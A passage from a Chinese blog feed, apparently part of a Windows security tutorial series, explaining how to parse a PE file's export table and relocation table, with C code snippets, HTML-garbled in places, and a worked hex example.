class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;由于`AddressOfNames`,`AddressOfFunctions`,和`AddressOfNameOrdinals`都是RVA值，且都需要进程RVA-&gt;FOA的转化。所以如果要获取这三个成员变量的FOA的话需要进行两部，第一将RVA转化为FOA，然后加上BaseAddress。</div></pre></td></tr></table></figure></p><p>//获取导出函数名数组<br>DWORD<em> dwAddressOfNames =(DWORD</em>)((ULONG_PTR)lpBaseAddress+ RvaToOffset(ExportTable-&gt;AddressOfNames,lpBaseAddress));<br>//获取导出函数数组<br>DWORD<em> dwAddressOfFunctions = (DWORD</em>)((ULONG_PTR)lpBaseAddress + RvaToOffset(ExportTable-&gt;AddressOfFunctions, lpBaseAddress));<br>//获取导出函数索引数组<br>DWORD<em> dwAddressOfNameOrdinals = (DWORD</em>)((ULONG_PTR)lpBaseAddress + RvaToOffset(ExportTable-&gt;AddressOfNameOrdinals, lpBaseAddress));<br><figure class="highlight dts"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;因为NumberOfFunctions&gt;=NumberOfNames,适合放在外部循环进行比较。</div></pre></td></tr></table></figure></p><p>for (i = 0; i &lt; dwNumberOfFunctions; i++){…}<br><figure class="highlight dts"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;在提到关于GetProcAddress用法时说道，如果目标函数在AddressOfFuns被找到记录其数组索引。然后在导出函数序号数组中寻找对应序号。</div></pre></td></tr></table></figure></p><p>if (<em>(WORD</em>)(dwAddressOfNameOrdinals + j * sizeof(WORD)) == i)<br>{}<br><figure class="highlight dts"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;接着取出我们的需要序号，以及在导出函数地址数组对应的序号所对应的导出函数地址</div></pre></td></tr></table></figure></p><p>//函数名称<br>FunName = (LPCSTR)((ULONG_PTR)lpBaseAddress + dwAddressOfNames[j <em> sizeof(WORD)]);  //VA值<br>//函数索引<br>FunOrdinal = </em>(WORD<em>)(dwAddressOfNameOrdinals + j </em> sizeof(WORD));<br>//函数地址   i=(dwAddressOfNameOrdinals + j <em> sizeof(WORD))   其实是索引值<br>//这里需要取其值，注意</em>(DWORD<em>)<br>FunAddress = </em>(DWORD<em>)(dwAddressOfFunctions + FunOrdinal </em> sizeof(DWORD));<br><figure class="highlight dts"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">    ![](https:<span class="comment">//i.loli.net/2019/04/21/5cbbed6a89dd0.png)</span></div><div class="line"></div><div class="line"><span class="meta"># 0x3 重定位表</span></div><div class="line"><span class="meta">## 0x3.1 重定位原理</span></div><div class="line"><span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;PE装载的时候，大多选用相对地址RVA，这样做的原因有二，第一是为了方便装载器，二是为了重定位。那么什么时候需要重定位呢，或者说重定位的条件是什么呢，我们应该知道每个进程内存是相互独立的，也就是说exe文件发生重定位的可能性不高，这样看来由于DLL的装载位置的不同，DLL文件发生重定位的可能性就比较高了，因为同一个进程空间里面可能存在多个DLL文件，有时候多个dll设定的原始的基地址是相同的，但是对于操作系统来说这是不允许存在的，所以需要对他们进行重定位。</div><div class="line"></div><div class="line"><span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;这时候就需要将那些需要被重定位的数据保存在一张表里面，然后取出里面的地址，利用某一个特定的公式，重新计算加载地址即可。</div><div class="line"></div><div class="line"><span class="meta">## 0x3.2 重定位表结构</span></div><div class="line"><span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;重定位表位于数据目录项中第<span class="number">6</span>项，通过上述的方法可以定位到文件中重定位表地址为<span class="number">0xE00</span></div><div class="line">    ![](https:<span class="comment">//i.loli.net/2019/04/21/5cbbf1da6e887.png)</span></div><div class="line">    ![](https:<span class="comment">//i.loli.net/2019/04/21/5cbc0fe5b5fcd.png)</span></div><div class="line"></div><div class="line"><span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;接下来，我们开始解析重定位表，在解析之前，需要了解重定位表结构。重定位表是由多个IMAGE_BASE_RELOCATION结构体构成的。有三个成员变量</div></pre></td></tr></table></figure></p><p>typedef struct _IMAGE_BASE_RELOCATION {<br>    DWORD   VirtualAddress;//RVA<br>    DWORD   SizeOfBlock;   //重定位数据大小<br>    WORD    TypeOffset;    // 重定位项数组<br>} IMAGE_BASE_RELOCATION,* PIMAGE_BASE_RELOCATION;<br><figure class="highlight dts"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">* VirtualAddress是重定位数组的RVA，**但是需要每个重定位数组地址加上这个RVA才是真正的重定位数组的地址**</div><div class="line">* SizeofBlock：重定位结构大小</div><div class="line">* TypeOffset：两个字节，<span class="number">16</span>位，高<span class="number">4</span>位表示重定位类型，低<span class="number">12</span>位表示重定位地址</div><div class="line"></div><div class="line"></div><div class="line"><span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;如图所有，解析如下：</div><div class="line"></div><div class="line">* VirtualAddress：<span class="number">00001000</span></div><div class="line">* sizeofBlock：<span class="number">10</span>H--&gt;(<span class="number">10</span>H<span class="number">-8</span>H)/<span class="number">2</span>=<span class="number">4</span>,一共有四个重定位数组，<span class="number">8</span>H指的是VirtualAddress和sizeofBlock所占的字节数为<span class="number">8</span>，除以<span class="number">2</span>H，表示一个TypeOffset为<span class="number">2</span>个字节。</div><div class="line">* Data1:<span class="number">0F</span>30--&gt;<span class="number">300F</span>--&gt;Type:<span class="number">3</span>--&gt;Addr:<span class="number">00F</span>--&gt;RVA:<span class="number">100F</span>h---&gt;FOA:<span class="number">60F</span></div><div class="line">* Data2:<span class="number">2330</span>--&gt;<span class="number">3023</span>--&gt;Type:<span class="number">3</span>--&gt;Addr:<span class="number">023</span>--&gt;RVA:<span class="number">1023</span>h---&gt;FOA:<span class="number">623</span></div><div class="line">* Data3:<span class="number">0000</span></div><div class="line">* Data4:<span class="number">0000</span></div><div class="line"></div><div class="line"><span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;得到需要重定位的数据为<span class="number">00402000</span>和<span class="number">00403030</span>，假设当前基地址为<span class="number">00400000</span>，目标基地址为<span class="number">01000000</span> 则重定位后的地址为<span class="number">01002000</span>和<span class="number">01003030</span></div><div class="line"></div><div class="line"><span class="meta">## 0x3.3 重定位表编程</span></div><div class="line"><span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;首先获取重定位表地址</div></pre></td></tr></table></figure></p><p>//重定位表地址<br>DWORD RelocTableRva = pNtHeaders-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress;<br>//    printf(“\t\t [<em>]RelocTableRva:%p\n”, RelocTableRva);<br>PIMAGE_BASE_RELOCATION RelocTable =(PIMAGE_BASE_RELOCATION)((ULONG)lpBaseAddress+RvaToOffset(RelocTableRva,lpBaseAddress));<br>printf(“\t\t [</em>]RelocTable:%p\n”, RelocTable);<br><figure class="highlight dts"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;获取每个重定位数组的RVA地址和大小，原因有二，第一，获取完TypeOffset的第<span class="number">12</span>位需要加上VirtualAddress才是真正的RVA，第二，sizeofBlock是指向下一个重定位数组(块)的重要参数。</div></pre></td></tr></table></figure></p><p>DWORD VirtualAddress = RelocTable-&gt;VirtualAddress;<br>printf(“\t\t [*]VirtualAddress:%p”, VirtualAddress);<br>DWORD Cout = (RelocTable-&gt;SizeOfBlock - 8) / 2;<br><figure class="highlight dts"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;定位到重定位数组，每个Typeoffset在偏移处第八个字节，所以需要加<span class="number">8</span>。</div></pre></td></tr></table></figure></p><p>WORD<em> RecAddr = (WORD</em>)((BYTE*)RelocTable + 8);<br><figure class="highlight dts"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;解析TypeOffset</div></pre></td></tr></table></figure></p><p>//取第三位地址，并加上VirtualAddress才是真的RVA<br>DWORD offset = VirtualAddress + (RecAddr[j] &amp; 0x0FFF);<br>//TYPE<br>DWORD type = RecAddr[j] &gt;&gt; 12;<br>printf(“\t\t Type:[%d] \t RVA:[%p]\n”, type, offset);<br><figure class="highlight dts"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;利用sizeofblock定位下一个重定位表</div></pre></td></tr></table></figure></p><p>RelocTable = (IMAGE_BASE_RELOCATION <em>)((BYTE </em>)RelocTable + RelocTable-&gt;SizeOfBlock);<br>```</p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;0x0-前言&quot;&gt;&lt;a href=&quot;#0x0-前言&quot; class=&quot;headerlink&quot; title=&quot;0x0 前言&quot;&gt;&lt;/a&gt;0x0 前言&lt;/h1&gt;&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;刚刚结束春招，投了好几家公司，结果不是很理想，原因无外乎自身实力和行业寒冬。&lt;/p&gt;
&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;这次春招面试题主要集中在PE相关，HOOK技术和DLL注入技术，还有一些杂七杂八的问题上面。从中也暴露处自己技能栈上的不足，通过这一段时间的沉淀希望可以补足。&lt;/p&gt;
&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;四月初就开始谋划写一系列的文章，但是加上在校实习比较忙碌，所以进展很慢，这些文章主要面向受众是那些入坑新人，借此希望能够让那些小伙伴能够少走弯路。同时也能多多总结自身的不足，共同进步。&lt;/p&gt;
&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;这系列文章取啥名？想了很久，决定参考某一师傅的系列文章—&amp;lt;一篇文章带你·····&amp;gt;,主要希望总结PE文件，HOOK,DLL注入，以及其他方面的知识，主要的参考文献是看雪&lt;strong&gt;加密解密第四版&lt;/strong&gt;，以及其他资料。(打了广告，希望相关师傅记得打点广告费)&lt;/p&gt;
&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;这系列是我边总结技术边写文章，可能部分内容会以后补全技能栈，例如R0下的DLL注入等。&lt;strong&gt;但是尽量做到不鸽&lt;/strong&gt;，关于代码，不提供自己写的代码，原因有二，第一，这些代码网上都有现成的，我只是理解修改部分罢了，也怕自己的代码误导小伙伴们。&lt;strong&gt;第二，拒绝伸手党&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;由于自身能力有限，文章中难免出现错误，希望各位师傅少喷我。&lt;/p&gt;
    
    </summary>
    
      <category term="windows安全" scheme="https://findream.github.io/categories/windows%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
</feed>
